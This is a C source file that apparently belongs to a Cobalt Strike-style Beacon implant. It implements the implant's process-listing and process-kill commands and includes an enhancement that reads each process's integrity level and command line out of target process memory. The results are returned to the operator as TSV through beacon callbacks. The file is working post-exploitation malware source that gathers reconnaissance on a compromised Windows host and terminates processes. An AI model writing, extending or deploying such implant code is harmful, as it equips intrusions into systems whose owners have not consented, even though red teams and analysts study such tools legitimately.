/*
 * List and Kill Processes
 */
#include <windows.h>
#include "syscalls.h"
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "tokens.h"
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"

void command_ps_kill(char * buffer, int length) {
	HANDLE h = NULL;
	DWORD pid;
	datap parser = {0};

	/* extract our PID */
	data_init(&parser, buffer, length);
	pid = data_int(&parser);

	h = beacon_OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (h && TerminateProcess(h, 0)) {
		/* do nothing, we're good */
	}
	else {
		post_error_dd(0x23, pid, GetLastError());
	}

	CloseHandle(h);
}

/* Get the username for a process */
BOOL ps_getusername( HANDLE hProcess, char * buffer, DWORD length ) {
	HANDLE hToken;
	BOOL result;

	if( !OpenProcessToken(hProcess, TOKEN_QUERY, &hToken ))
		return FALSE;
	result = token_user(hToken, buffer, length);
	CloseHandle( hToken );

	return result;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
	if (is_x64() || is_wow64(GetCurrentProcess())) {
		return !is_wow64(process);
	}

	return FALSE;
}

/* ---------------------------------------------------------------------------
 * 4.13 ps enhancements (tier-3 item 11): integrity level + command line.
 * The six classic columns (name ppid pid arch user session) grow to eight;
 * a process whose handle we could not open keeps the classic 3-column
 * fallback line. Command-line tabs collapse to spaces so the TSV wire
 * format stays parseable by the client.
 * ------------------------------------------------------------------------- */

/* map a token integrity RID to its short label */
static const char * ps_integrity_label(DWORD rid) {
	if (rid < 0x2000)  return "Low";
	if (rid < 0x4000)  return "Medium";
	if (rid < 0xC000)  return "High";
	return "System";
}

static void ps_getintegrity(HANDLE hProcess, char * buffer, DWORD length) {
	HANDLE hToken = NULL;
	DWORD  need = 0;
	TOKEN_MANDATORY_LABEL * tml = NULL;
	DWORD  rid;

	buffer[0] = '\0';
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		return;

	if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &need) || need == 0) {
		CloseHandle(hToken);
		return;
	}
	tml = (TOKEN_MANDATORY_LABEL *)malloc(need);
	if (tml == NULL) {
		CloseHandle(hToken);
		return;
	}
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, tml, need, &need)) {
		free(tml);
		CloseHandle(hToken);
		return;
	}
	rid = *GetSidSubAuthority(tml->Label.Sid,
		*GetSidSubAuthorityCount(tml->Label.Sid) - 1);
	_snprintf(buffer, length - 1, "%s", ps_integrity_label(rid));

	free(tml);
	CloseHandle(hToken);
}

/* ProcessCommandLineInformation (99): returns a UNICODE_STRING whose Buffer
 * lives in the target address space, so read it back through the handle.
 * Local struct spelling: winnt.h's UNICODE_STRING is not consistently
 * visible across our include set. */
typedef struct _PS_CMDLINE_US {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} PS_CMDLINE_US;

static void ps_getcmdline(HANDLE hProcess, char * buffer, DWORD length) {
	typedef LONG (WINAPI *NQIP)(HANDLE, int, PVOID, ULONG, PULONG);
	static NQIP pQIP = NULL;
	PS_CMDLINE_US us;
	SIZE_T got = 0;
	wchar_t * wide = NULL;
	int i;

	buffer[0] = '\0';
	if (pQIP == NULL) {
		pQIP = (NQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
		if (pQIP == NULL)
			return;
	}

	memset(&us, 0, sizeof(us));
	if (pQIP(hProcess, 99, &us, sizeof(us), NULL) != 0 || us.Buffer == NULL || us.Length == 0)
		return;
	if (us.Length > 32766)
		us.Length = 32766;

	wide = (wchar_t *)malloc(us.Length + 2);
	if (wide == NULL)
		return;
	if (!beacon_ReadProcessMemory(hProcess, us.Buffer, wide, us.Length, &got) || got == 0) {
		free(wide);
		return;
	}
	wide[us.Length / 2] = L'\0';

	/* narrow copy with tab collapse (TSV wire safety) */
	for (i = 0; i < us.Length / 2 && i < (int)length - 1; i++) {
		wchar_t c = wide[i];
		buffer[i] = (c == L'\t' || c == L'\n' || c == L'\r') ? ' ' : (char)c;
	}
	buffer[i] = '\0';

	free(wide);
}

void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	char user[2048] = {0};
	char integrity[32] = {0};
	char cmdline[1024] = {0};
	formatp         format;
	DWORD sessid;
	char * x64 = "x64";
	char * x86 = "x86";
	char * arch;
	char * native;

	datap  parser;
	int    reqid;

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* extract our callback ID */
	reqid = data_int(&parser);

	/* init our output buffer */
	bformat_init(&format, 32768);

	/* copy the callback ID to our output */
	if (reqid > 0)
		bformat_int(&format, reqid);

	/* check what kind of process we are...  since Beacon is 32-bit only */
	if (is_wow64(GetCurrentProcess()))
		native = x64;
	else
		native = is_x64() ? x64 : x86;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( hProcessSnap == INVALID_HANDLE_VALUE ) {
		bformat_free(&format);
		return;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof( PROCESSENTRY32 );

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if( !Process32First( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );          // clean the snapshot object
		bformat_free(&format);
		return;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {
		hProcess = beacon_OpenProcess(is_vista_or_later() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );

		if( !hProcess ) {
			bformat_printf(&format, "%s\t%d\t%d\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID);
		}
		else {
			if (!ps_getusername(hProcess, user, 2048))
				user[0] = '\0';

			if (!ProcessIdToSessionId(pe32.th32ProcessID, &sessid))
				sessid = -1;

			if (is_wow64(hProcess)) {
				arch = x86;
			}
			else {
				arch = native;
			}

			/* 4.13 ps: integrity level + command line (8-column TSV) */
			ps_getintegrity(hProcess, integrity, 32);
			ps_getcmdline(hProcess, cmdline, 1024);

			bformat_printf(&format, "%s\t%d\t%d\t%s\t%s\t%d\t%s\t%s\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID, arch, user, sessid, integrity[0] ? integrity : "n/a", cmdline[0] ? cmdline : "n/a");
		}

		CloseHandle(hProcess);
	}
	while( Process32Next( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );

	if (reqid == 0) {
		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PROCESS_LIST);
	}
	else {
		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);
	}

	bformat_free(&format);
	return;
}
